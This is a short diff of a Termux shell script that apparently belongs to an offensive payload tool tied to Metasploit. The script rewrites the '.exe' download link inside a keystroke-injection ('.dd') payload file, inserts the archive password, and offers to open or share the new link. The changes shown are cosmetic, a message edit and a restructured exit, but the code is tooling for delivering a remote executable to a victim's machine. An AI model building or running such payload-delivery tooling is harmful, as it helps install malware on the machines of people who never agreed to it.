@@ -83,7 +83,7 @@ else
 	echo "$(cat $DDFILEENCRYPTED | sed "s#$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > /storage/emulated/0/utiles/payload.dd
 	echo "::::The links have been changed"
 	echo "$(cat /storage/emulated/0/utiles/payload.dd | perl -p -e "s/SECRET/$password/")" > /storage/emulated/0/utiles/payload.dd
-	echo "::::The archive password has been added to the .dd file"
+	echo "::::The archive password has been added to the .dd file (if you encrypt the payload)"
 fi
 echo "\033[1;33m\n:::: If you have upload the payload check this:\n:::: If there is no new link, the upload failed \033[0m"
 echo "\nold link: \033[1;32m $(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
@@ -104,6 +104,5 @@ echo "\033[1;35m\n:::: Do you want to open the link ? (for QR CODE or Sharing)\n
 read openlink
 if [ $openlink = "y" ]
 	termux-open-url $NEWLINK
-else
-	exit
 fi
+exit
